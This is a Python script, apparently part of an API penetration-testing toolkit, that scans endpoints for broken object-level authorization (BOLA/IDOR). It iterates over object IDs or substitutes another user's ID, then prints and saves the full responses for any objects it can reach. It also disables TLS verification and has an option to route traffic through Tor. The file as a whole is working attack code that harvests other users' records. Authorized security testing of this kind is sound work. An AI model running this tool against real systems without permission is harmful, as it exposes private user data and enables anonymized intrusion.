#!/usr/bin/env python3
import requests
import argparse
import urllib3
import json

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

COMMON_ID_PARAMS = ["id", "user_id", "account_id", "profile_id", "order_id", "item_id", "doc_id", "file_id"]

def test_bola(url, token=None, id_range=5, proxies=None):
    """
    Iterates over a range of object IDs and checks if unauthorized
    objects are accessible. Confirms BOLA/IDOR if a 200 response
    is returned for an ID that shouldn't be accessible.
    """
    headers = {}
    if token:
        headers["Authorization"] = f"Bearer {token}"

    print(f"[*] Testing BOLA/IDOR on {url}")
    print(f"[*] Testing IDs 1 through {id_range}\n")

    confirmed = []

    for obj_id in range(1, id_range + 1):
        target = f"{url}/{obj_id}"
        print(f"[*] Requesting: {target}")

        try:
            r = requests.get(target, headers=headers, verify=False, proxies=proxies, timeout=10)
        except requests.exceptions.RequestException as e:
            print(f"[!] Request error: {e}")
            continue

        print(f"    Status: {r.status_code}")

        if r.status_code == 200:
            print(f"[+] Object {obj_id} accessible — possible BOLA/IDOR!")
            print(f"    Response preview: {r.text[:200]}\n")
            confirmed.append({"id": obj_id, "url": target, "response": r.text})
        elif r.status_code == 403:
            print(f"    [-] Object {obj_id} forbidden (access control working)\n")
        elif r.status_code == 404:
            print(f"    [-] Object {obj_id} not found\n")
        else:
            print(f"    [?] Unexpected status code: {r.status_code}\n")

    if confirmed:
        print(f"[+] BOLA/IDOR confirmed — {len(confirmed)} object(s) accessible")
    else:
        print("[-] No BOLA/IDOR detected")

    return confirmed

def test_bola_parameter(url, param, own_id, test_id, method="GET", token=None, proxies=None):
    """
    Tests a specific parameter for IDOR by substituting a different
    user's ID and checking if the response differs from the baseline.
    """
    headers = {}
    if token:
        headers["Authorization"] = f"Bearer {token}"

    print(f"[*] Testing parameter-based IDOR on {url}")
    print(f"[*] Own ID: {own_id} | Testing ID: {test_id}\n")

    try:
        # Baseline with own ID
        if method.upper() == "GET":
            baseline = requests.get(url, params={param: own_id}, headers=headers, verify=False, proxies=proxies, timeout=10)
            target = requests.get(url, params={param: test_id}, headers=headers, verify=False, proxies=proxies, timeout=10)
        elif method.upper() == "POST":
            baseline = requests.post(url, json={param: own_id}, headers=headers, verify=False, proxies=proxies, timeout=10)
            target = requests.post(url, json={param: test_id}, headers=headers, verify=False, proxies=proxies, timeout=10)
        else:
            print(f"[!] Unsupported method: {method}")
            return None

    except requests.exceptions.RequestException as e:
        print(f"[!] Request error: {e}")
        return None

    print(f"[*] Baseline (own ID {own_id}) status: {baseline.status_code}")
    print(f"[*] Target (test ID {test_id}) status: {target.status_code}")

    if target.status_code == 200 and baseline.text != target.text:
        print(f"[+] IDOR confirmed! Different response returned for ID {test_id}")
        print(f"    Response preview: {target.text[:200]}")
        return {"param": param, "own_id": own_id, "test_id": test_id, "response": target.text}
    elif target.status_code == 200 and baseline.text == target.text:
        print(f"[?] Same response for both IDs — may not be vulnerable or IDs return identical data")
    else:
        print(f"[-] No IDOR detected for parameter '{param}'")

    return None

def save_results(confirmed, outfile):
    with open(outfile, "w") as f:
        for item in confirmed:
            f.write(f"ID: {item['id']} | URL: {item['url']}\n")
            f.write(f"Response: {item['response']}\n\n")
    print(f"[+] Results saved to {outfile}")

def main():
    parser = argparse.ArgumentParser(description="BOLA/IDOR Detection Module")
    parser.add_argument("url", help="Target API endpoint (e.g. http://target.com/api/users)")
    parser.add_argument("--token", help="Bearer token for authenticated requests")
    parser.add_argument("--range", type=int, default=5, dest="id_range", help="Number of IDs to test (default: 5)")
    parser.add_argument("--param", help="Parameter name for parameter-based IDOR testing")
    parser.add_argument("--own-id", help="Your own user ID (for parameter-based testing)")
    parser.add_argument("--test-id", help="Target user ID to test against")
    parser.add_argument("--method", default="GET", choices=["GET", "POST"], help="HTTP method (default: GET)")
    parser.add_argument("--tor", action="store_true", help="Route traffic through Tor")
    parser.add_argument("--outfile", default=None, help="Save results to file")

    args = parser.parse_args()

    proxies = None
    if args.tor:
        print("[*] Routing traffic through Tor...")
        proxies = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}

    # Parameter-based IDOR test
    if args.param and args.own_id and args.test_id:
        result = test_bola_parameter(
            args.url,
            args.param,
            args.own_id,
            args.test_id,
            args.method,
            args.token,
            proxies
        )

    # Path-based BOLA test
    else:
        confirmed = test_bola(
            args.url,
            args.token,
            args.id_range,
            proxies
        )

        if confirmed and args.outfile:
            save_results(confirmed, args.outfile)

if __name__ == "__main__":
    main()
